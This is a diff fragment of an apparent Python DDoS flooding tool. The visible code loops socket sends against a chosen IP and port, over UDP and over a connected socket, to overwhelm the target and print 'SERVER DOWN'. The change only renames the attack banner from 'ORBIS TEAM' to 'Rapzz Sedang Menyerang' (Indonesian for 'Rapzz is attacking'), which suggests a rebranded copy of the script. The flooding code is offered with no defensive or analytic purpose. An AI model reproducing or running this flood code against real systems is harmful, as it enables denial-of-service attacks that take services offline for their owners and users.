@@ -29,7 +29,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" Rapzz Sedang Menyerang!!!")
 		except:
 			print("[!] SERVER DOWN!!!")
 
@@ -43,7 +43,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" Rapzz Sedang Menyerang!!!")
 		except:
 			s.close()
 			print("[*] SERVER DOWN")
